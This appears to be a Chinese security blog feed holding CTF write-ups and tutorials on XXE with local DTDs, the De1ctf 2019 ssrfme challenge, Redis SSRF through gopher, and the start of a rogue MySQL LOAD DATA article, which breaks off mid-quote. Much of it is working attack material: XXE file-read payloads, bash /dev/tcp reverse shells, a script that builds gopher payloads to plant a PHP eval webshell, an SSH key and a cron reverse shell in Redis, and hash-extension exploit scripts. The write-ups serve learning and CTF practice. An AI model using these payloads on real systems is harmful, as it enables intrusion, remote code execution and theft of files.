&quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>在payload的最后我们连续调用了三个参数实体<code>%remote;%int;%send;</code>，这就是我们的利用顺序。<code>%remote</code>先告诉解释器请求远程URL的<code>test.dtd</code>，随后<code>%int</code>调用参数实体中的<code>$file</code>，这将请求test.txt的内容并将其编码，最后调用<code>%send</code>将数据发送到vps上。</p><h2 id="Exploiting-XXE-with-local-DTD-files"><a href="#Exploiting-XXE-with-local-DTD-files" class="headerlink" title="Exploiting XXE with local DTD files"></a>Exploiting XXE with local DTD files</h2><p>8/30/2019 10:47:36 AM </p><p>在Ogeak-ctf里碰上一道xxe的题，<a href="http://47.107.253.140:18080/webserver/" title="题目链接" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/</a></p><p>在源码里找到一段奇怪的JS</p><pre><code>var data = &quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n&lt;request&gt;\n    &lt;status&gt;1&lt;/status&gt;\n&lt;/request&gt;&quot;;setInterval(function(){    $.post(&quot;callback&quot;, data);}, 10000);</code></pre><p>当时看不懂这是干嘛的，因为也有事也就没做了。事后再看这段代码发现是一个定时函数，每10秒post一个xml实体。我们抓包看一下</p><p>在实体部分找上文的最简单的例子，不包含任何读文件的代码试一下发现返回<code>200</code>，内容异常返回<code>500</code>.</p><p>听大佬说是屏蔽了外网，不允许我们请求外网服务器，只能利用本地DTD了。</p><p>原理看<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" title="这里" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><p>读完大意就是如果我们找到了一个内部的DTD，我们可以强制在目标主机上调用这个本地dtd文件，在这个文件中重写上一步我们在内部DTD中找到的参数。如果我们定义了两个同名实体，只有第一个会被执行。于是我们可以利用重写的本地DTD文件触发报错来读我们的目标文件内容。</p><p>like this</p><pre><code>Request&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;    &lt;!ENTITY % condition &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;any text&lt;/message&gt;    Responsejava.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/usr/bin/nologindaemon:x:2:2:daemon:/:/usr/bin/nologin(No such file or directory)</code></pre><p>Contents of sip-app_1_0.dtd</p><pre><code>…&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;&lt;!ELEMENT pattern (%condition;)&gt;…</code></pre><p>这里使用三层的实体嵌套，第二层中我们给定义参数实体的<code>%</code>进行编码，第三层中对<code>空格</code>,<code>&#39;</code>,<code>&quot;</code>,<code>&amp;</code>,<code>%</code>都进行了编码。代码里先调用<code>%local_dtd</code>，然后在对应的dtd文件中调用了<code>% condition</code>,在<code>condition</code>定义的实体中调用<code>eval</code>和<code>error</code>。在<code>error</code>的最后我们调用<code>%file</code>来获取文件内容。为什么不使用两层嵌套的原因是会报错<code>PEReferences forbidden in internal subset in Entity</code>指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。</p><p>于是我们<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" title="依据此" target="_blank" rel="noopener">依据此</a>找到一个dtd文件来利用，这个<code>fonts.dtd</code>刚好是<code>tomcat:8-jre8</code> 里有的</p><pre><code>&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!ENTITY % expr &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;&lt;/message&gt;</code></pre><p>于是我们通过构造一个错误的url将数据带出，通过报错信息得到了flag</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a><br><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1ctf</title>
      <link href="/2019/08/16/De1ctf/"/>
      <url>/2019/08/16/De1ctf/</url>
      
        <content type="html"><![CDATA[<p>这次比赛真的超有意思的！我超级喜欢的！做了半天啥都没做出来，看着那个樱花🌸全程陶醉~</p><a id="more"></a><h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>源码 </p><pre><code>#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&apos;latin1&apos;)app = Flask(__name__)secert_key = os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)    def Exec(self):        result = {}        result[&apos;code&apos;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)                resp = scan(self.param)                if (resp == &quot;Connection Timeout&quot;):                    result[&apos;data&apos;] = resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&apos;code&apos;] = 200            if &quot;read&quot; in self.action:                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)                result[&apos;code&apos;] = 200                result[&apos;data&apos;] = f.read()            if result[&apos;code&apos;] == 500:                result[&apos;data&apos;] = &quot;Action Error&quot;        else:            result[&apos;code&apos;] = 500            result[&apos;msg&apos;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&apos;/&apos;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check=param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &apos;__main__&apos;:    app.debug = False    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p><pre><code>def Exec(self):    result = {}    result[&apos;code&apos;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&apos;data&apos;] = resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&apos;code&apos;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)            result[&apos;code&apos;] = 200            result[&apos;data&apos;] = f.read()        if result[&apos;code&apos;] == 500:            result[&apos;data&apos;] = &quot;Action Error&quot;    else:        result[&apos;code&apos;] = 500        result[&apos;msg&apos;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p><pre><code>#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p><pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p><pre><code>def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p><pre><code>def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p><pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p><h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><pre><code>import urllib,hashpumpy import requests&quot;&quot;&quot;    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&quot;&quot;&quot;url = &quot;http://139.180.128.86/&quot;#get the Sign of ScangeneSign = &quot;geneSign?&quot;payload = &quot;local_file:flag.txt&quot;re = requests.get(url+geneSign+&quot;param=&quot;+payload).textprint re#hash extend attackhashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)print hashsaction = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;cookie = {    #&quot;action&quot;:urllib.quote(hashextend),    &quot;action&quot;:action,        &quot;sign&quot;:hashs}print cookiere2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)print re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p><pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ceInput Data: local_file:flag.txtscanInput Key Length: 16Input Data to Add: read636d649a50e61e75436cc1ba50d5a003local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p><blockquote><p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p><p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p><p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p><p>You could also use a length extension attack, but this way is more simple.</p><p>So our exploit is complete.</p></blockquote><p>这是他们编写的脚本：膜</p><pre><code>import requestsdef geneSign(param):    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).textrealParam = &quot;flag.txt&quot;param = realParam+&quot;read&quot;sign = geneSign(param)param = realParamaction = &quot;readscan&quot;answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).textprint(answer)</code></pre>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis与ssrf</title>
      <link href="/2019/08/16/SSRF/"/>
      <url>/2019/08/16/SSRF/</url>
      
        <content type="html"><![CDATA[<p>SSRF留坑，没整理完。我真是个小菜鸡~</p><a id="more"></a><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h3><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><h1 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h1><ul><li>添加端口 127.0.0.1:80</li><li>短网址 <a href="http://sina.lt/" title="短网址" target="_blank" rel="noopener">http://sina.lt/</a></li><li>指向任意IP的域名 <a href="xip.io">xip.io</a></li><li>进制转换，点分十进制，八进制，二进制，十六进制，不同进制组合</li></ul><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>结合<code>dict://  file://  gopher://</code></p><pre><code>http://www.baidu.com@127.0.0.1</code></pre><h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><h2 id="定时任务写shell"><a href="#定时任务写shell" class="headerlink" title="定时任务写shell"></a>定时任务写shell</h2><p>crontab 格式 <a href="https://www.jb51.net/LINUXjishu/19905.html" title="参数解释" target="_blank" rel="noopener">https://www.jb51.net/LINUXjishu/19905.html</a></p><p>反弹shell </p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</code></pre><p>利用redis写入</p><pre><code>root@kali:~# cd redis-2.8.3/root@kali:~/redis-2.8.3# cd srcroot@kali:~/redis-2.8.3/src# ./redis-cli127.0.0.1:6379&gt; * * /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2444 0&gt;&amp;1\n&quot;OK127.0.0.1:6379&gt; config set dir /var/spool/cronOK127.0.0.1:6379&gt; config set dbfilename rootOK127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt; quit</code></pre><h1 id="使用工具无脑生成payload"><a href="#使用工具无脑生成payload" class="headerlink" title="使用工具无脑生成payload"></a>使用工具无脑生成payload</h1><p>先使用<code>./sniffer -p6379</code> 监听网卡，然后在本地redis服务中使用命令，随后断开，sniffer会打印出<code>payload</code></p><p>我们只要加上<code>curl &#39;gopher://127.0.0.1:6379/_payload&#39;</code>即可</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote><p><a href="https://xz.aliyun.com/t/5844#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5844#toc-3</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis与ssrf</title>
      <link href="/2019/08/10/redis/"/>
      <url>/2019/08/10/redis/</url>
      
        <content type="html"><![CDATA[<p>wula!<br>我爱学习！🤫</p><a id="more"></a><h1 id="redis协议分析"><a href="#redis协议分析" class="headerlink" title="redis协议分析"></a>redis协议分析</h1><p>tcpdump抓包</p><pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p><pre><code>127.0.0.1:6379&gt; set name testOK127.0.0.1:6379&gt; get name&quot;test&quot;127.0.0.1:6379&gt; </code></pre><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>RESP在Redis中用作请求-响应协议的方式如下</p><pre><code>1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。2. 服务器根据命令实现回复一种RESP类型。</code></pre><p>在RESP中。某些数据的类型取决于第一个字节：</p><ol><li>对于<code>Simple Strings</code>，回复的第一个字节是+</li><li>对于<code>error</code>,回复的第一个字节是-</li><li>对于<code>Integer</code>,，回复的第一个字节是:</li><li>对于<code>Bulk Strings</code>,回复的第一个字节是$</li><li>对于<code>array</code>,回复的第一个字节是*</li><li>此外，resp能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值</li><li>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束</li></ol><p>现在来看一下我们抓的包</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg" alt="抓包协议分析1"></p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg" alt="协议分析2"></p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg" alt="协议分析3"></p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg" alt="协议分析4"></p><p>整体来看一下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="整个通信过程"></p><p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p><p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p><h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>能未授权或通过弱口令访问到redis服务器</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见SSRF攻击方式大概这几种：</p><ol><li>绝对路径写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li></ol><h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>构造redis命令</p><pre><code>flushallset 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;config set dir /var/www/htmlconfig set dbfilename shell.phpsave</code></pre><p>转换为redis RESP格式</p><pre><code>import urllibprotocol=&quot;gopher://&quot;ip=&quot;192.168.163.128&quot;port=&quot;6379&quot;shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;,     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),     &quot;config set dir {}&quot;.format(path),     &quot;config set dbfilename {}&quot;.format(filename),     &quot;save&quot;     ]if passwd:    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):    CRLF=&quot;\r\n&quot;    redis_arr = arr.split(&quot; &quot;)    cmd=&quot;&quot;    cmd+=&quot;*&quot;+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)    cmd+=CRLF    return cmdif __name__==&quot;__main__&quot;:    for x in cmd:        payload += urllib.quote(redis_format(x))    print payload</code></pre><p>生成之后用curlr然后查询shell是否写入</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg" alt="写shell"></p><p>写入成功</p><h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p><p>构造redis命令</p><pre><code>flushallset 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali&apos;config set dir /root/.ssh/config set dbfilename authorized_keyssave</code></pre><p>改第一个脚本</p><pre><code>filename=&quot;authorized_keys&quot;ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;path=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p><h3 id="利用contrab计划反弹shell"><a href="#利用contrab计划反弹shell" class="headerlink" title="利用contrab计划反弹shell"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p><p>构造redis命令</p><pre><code>flushallset 1 &apos;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&apos;config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>改第一个命令</p><pre><code>reverse_ip=&quot;192.168.163.132&quot;reverse_port=&quot;2333&quot;cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)filename=&quot;root&quot;path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote><p><a href="https://xz.aliyun.com/t/5665#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-11</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL LOAD DATA</title>
      <link href="/2019/08/07/MySQL-LOAD-DATA/"/>
      <url>/2019/08/07/MySQL-LOAD-DATA/</url>
      
        <content type="html"><![CDATA[<p>通过伪造恶意服务器造成的攻击<br>😫😄</p><a id="more"></a><h1 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h1><h2 id="启动mysql服务"><a href="#启动mysql服务" class="headerlink" title="启动mysql服务"></a>启动mysql服务</h2><pre><code>service mysql startMariaDB [mysql]&gt; create database test;MariaDB [test]&gt; create table users(    -&gt; id int auto_increment primary key,    -&gt; username varchar(30),    -&gt; password varchar(30));Query OK, 0 rows affected (0.026 sec)MariaDB [test]&gt; insert into users (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</code></pre><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><pre><code>use mysqlupdate user set password=PASSWORD(&apos;admin&apos;) where User=&apos;root&apos;;flush privileges;quitservice mysql restartmysql -h 127.0.0.1 -u root -p  #如果tcpdump抓不到包就尝试设置 -h参数指定为本地回环地址</code></pre><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><pre><code>tcpdump -i lo port 3306 -w test.cap</code></pre><p>tcpdump使用指南：<a href="https://www.cnblogs.com/pyng/p/9698723.html" title="tcpdump使用" target="_blank" rel="noopener">https://www.cnblogs.com/pyng/p/9698723.html</a></p><h1 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h1><p>load data infile 主要是读取一个文件的内容并且放到一个表中，通常有两种用法</p><pre><code>load data infile &quot;/data/data.csv&quot; into table TestTable fields terminated by &apos;分隔符;            //读取服务器文件load data local infile &quot;/home/lightless/data.csv&quot; into table TestTable fields terminated by &apos;分隔符; //读取本地文件</code></pre><p>查看官方文档<br><img src="https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>我们读取本地文件，并抓取3306端口流量分析</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdhx9h84j30jx02lt9b.jpg" alt="读取本地文件 test.txt"></p><p>文件内容是 <code>hello world!</code></p><p>抓取流量</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdhzvg9vj30k602n0u2.jpg" alt="抓取3306端口流量"></p><p>丢进wireshark</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdi51lqsj30l20kz77j.jpg" alt="客户端请求服务器"></p><p>第一个包看起来比较正常，是客户端发起的<code>Request Query</code>，如果你无法使用<code>LOAD DATA INFILE</code>语法的话，考虑在连接 <code>MySQL</code> 的时候加上<code>--enable-local-infile</code>选项，或者设置<code>local_infile</code>全局变量为<code>ON</code>。我们可以看到第一个数据包是客户端发送的请求包，包含了请求命令。</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5rdi2fq31j30kd0cgjt2.jpg" alt="服务器应答"></p><p>服务器对请求做出响应，响应内容包含了文件名。</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdi7lfm1j30kx0dyjtf.jpg" alt="客户端发出请求，发送文件内容"></p><p>客户端发送服务器返回的文件名的文件内容给服务器。</p><p>于是我们想到，如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，并附上我们指定的文件，是不是就可以读取客户端的文件了，答案是肯定的。引用大佬<a href="https://lightless.me/archives/read-mysql-client-file.html" title="大佬" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a>的文章</p><blockquote><pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！服务端：OK，读取你本地 data.csv 